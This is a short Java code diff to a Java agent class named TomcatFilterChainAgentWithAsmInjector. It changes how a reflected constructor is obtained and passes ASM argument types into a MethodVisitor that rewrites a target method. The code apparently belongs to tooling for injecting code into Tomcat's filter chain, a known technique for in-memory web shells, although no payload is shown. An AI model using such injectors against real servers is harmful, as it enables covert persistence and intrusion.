@@ -20,7 +20,7 @@ public class TomcatFilterChainAgentWithAsmInjector implements ClassFileTransform
     static {
         try {
             Class<?> clazz = Class.forName(getClassName());
-            constructor = clazz.getDeclaredConstructor(MethodVisitor.class);
+            constructor = clazz.getConstructors()[0];
             constructor.setAccessible(true);
         } catch (Exception e) {
             e.printStackTrace();
@@ -64,7 +64,8 @@ public class TomcatFilterChainAgentWithAsmInjector implements ClassFileTransform
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (TARGET_METHOD_NAME.equals(name)) {
                     try {
-                        return (MethodVisitor) constructor.newInstance(mv);
+                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                        return (MethodVisitor) constructor.newInstance(mv, argumentTypes);
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
